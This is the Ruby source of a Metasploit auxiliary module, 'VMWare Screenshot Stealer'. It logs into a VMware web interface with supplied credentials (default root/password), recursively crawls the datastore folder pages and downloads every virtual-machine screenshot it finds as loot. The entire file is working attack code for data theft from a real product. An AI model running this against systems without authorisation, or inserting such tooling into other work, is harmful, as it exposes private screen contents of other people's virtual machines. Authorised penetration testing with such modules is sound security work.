##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::VIMSoap
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'           => 'VMWare Screenshot Stealer',
      'Description'    => %Q{
        This module uses supplied login credentials to connect to VMWare via
        the web interface. It then searches through the datastores looking for screenshots.
        It will download any screenshots it finds and save them as loot.
      },
      'Author'         => ['theLightCosine'],
      'License'        => MSF_LICENSE
    )

    register_options(
      [
        Opt::RPORT(443),
        OptString.new('USERNAME', [ true, "The username to Authenticate with.", 'root' ]),
        OptString.new('PASSWORD', [ true, "The password to Authenticate with.", 'password' ])
      ])

    register_advanced_options([OptBool.new('SSL', [ false, 'Negotiate SSL for outgoing connections', true]),])
  end

  def run_host(ip)
    if vim_do_login(datastore['USERNAME'], datastore['PASSWORD']) == :success
      @user_pass = Rex::Text.encode_base64(datastore['USERNAME'] + ":" + datastore['PASSWORD'])
      crawl_page('/folder')
    else
      print_error "Login Failure on #{ip}"
      return
    end
  end



  def crawl_page(path, parent='')
    res = send_request_cgi({
      'uri'     => path,
      'method'  => 'GET',
      'cookie'  => @vim_cookie,
      'headers' => { 'Authorization' => "Basic #{@user_pass}"}
    }, 25)
    if res
      @vim_cookie = res.get_cookies
      if res.code== 200
        res.body.scan(/<a href="([\w\/\?=&;%]+)">/) do |match|
          link = match[0]
          link.gsub!('&amp;', '&')
          case link
          when /%2epng?/
            img_name = Rex::Text::uri_decode(link.match(/\/([\w\?=&;%]+%2epng)/)[1])
            print_good "Screenshot Found: #{img_name} Full Path: #{link}"
            grab_screenshot(link, img_name)
          when  /%2e(?!png)/
            next
          when parent
            next
          else
            crawl_page(link, path)
          end
        end
      elsif res.code == 401
        print_error "Authorization Failure for: #{path}"
      end
    end
  end

  def grab_screenshot(path, name)
    res = send_request_cgi({
      'uri'     => path,
      'method'  => 'GET',
      'cookie'  => @vim_cookie,
      'headers' => { 'Authorization' => "Basic #{@user_pass}"}
    }, 25)
    if res
      @vim_cookie = res.get_cookies
      if res.code == 200
        img = res.body
        ss_path = store_loot("host.vmware.screenshot", "image/png", datastore['RHOST'], img, name , "Screenshot of VM #{name}")
        print_good "Screenshot saved to #{ss_path}"
      else
        print_error "Failed to retrieve screenshot at #{path} HTTP Response code #{res.code} "
      end
    else
      print_error "Failed to retrieve screenshot: there was no reply"
    end

  end
end
